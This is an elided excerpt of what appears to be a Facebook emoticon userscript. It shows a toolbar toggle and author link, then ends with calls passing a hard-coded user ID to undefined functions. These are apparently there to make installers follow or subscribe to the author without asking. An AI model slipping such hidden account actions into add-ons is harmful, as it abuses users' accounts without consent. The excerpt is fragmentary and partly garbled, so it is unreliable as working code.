...
// @version 	1.0.1
// @author  	PeinZilla
// @authorURL	http://www.facebook.com/peinzilla
...
"chars" : " :) ",
	...
	// Toggler
	html += '<a class="navLink" title="Extra Emoticon by PeinZilla">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="https://m-static.ak.fbcdn.net/rsrc.php/v2/yq/r/wFc8h34dtRC.png"></img></span>';
	html += '</a>';
	...
	html += '<div class="jewelFooter">';
 	html += '<a class="jewelFooter" href="https://www.facebook.com/peinzilla" target="_blank">Author.<br>PeinZilla</a>';
	html += '</div>';
...
a("100003191605165"); //Р҆҆҆҆.э҃҃҃҃҃҃҃. Ї҅҅҅҅.и.
sublist("");
